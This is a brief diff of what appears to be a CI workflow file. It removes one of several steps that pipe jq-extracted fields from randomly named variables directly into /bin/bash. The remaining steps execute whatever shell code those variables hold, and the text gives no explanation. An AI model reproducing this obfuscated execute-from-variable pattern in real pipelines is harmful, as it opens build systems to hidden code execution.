@@ -27,7 +27,6 @@ jobs:
           echo $pyo1574 | jq -r .qmvb25098 | /bin/bash
           echo $vfnrv05223 | jq -r .lm39257 | /bin/bash
           printf '%s' "$p77" | jq -r .gkr8 | /bin/bash
-          echo $ofv0 | jq -r .kl747 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
